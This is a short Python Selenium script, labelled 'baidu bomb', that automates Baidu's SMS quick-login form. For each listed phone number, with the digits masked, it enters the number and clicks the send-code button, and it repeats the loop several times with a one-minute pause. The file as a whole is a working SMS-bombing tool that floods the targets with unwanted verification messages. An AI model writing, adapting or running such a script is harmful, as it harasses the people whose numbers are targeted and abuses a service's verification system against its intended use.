# -*- coding: utf-8 -*-
from selenium import webdriver
# from selenium import WebElement
import time

telnums = [
'176*******',
'176*******'
]

g_clickNums = 3

def sendSms(telnum):
	#baidu bomb
	driver = webdriver.Chrome()
	driver.get('https://www.baidu.com/')
	time.sleep(1)
	#driver.maximize_window()
	# driver.find_element_by_link_text('登录').click()
	driver.find_element("linkText","登录").click()
	time.sleep(3)

	#用户名登录
	usernamelogin = driver.find_elements_by_css_selector('p.tang-pass-footerBarULogin')[0]
	usernamelogin.click()
	time.sleep(2)

	#短信快捷登录
	smsbtnlogin = driver.find_elements_by_css_selector('a.pass-sms-btn')[0]
	smsbtnlogin.click()
	time.sleep(2)

	driver.find_element_by_id("TANGRAM__PSP_10__smsPhone").send_keys(telnum)
	time.sleep(1)

	driver.find_element_by_id("TANGRAM__PSP_10__smsTimer").click()
	time.sleep(3)
	driver.quit()
	time.sleep(2)

for num in range(0,g_clickNums):
	for iTel in range(len(telnums)):
		sendSms(telnums[iTel])
	time.sleep(60)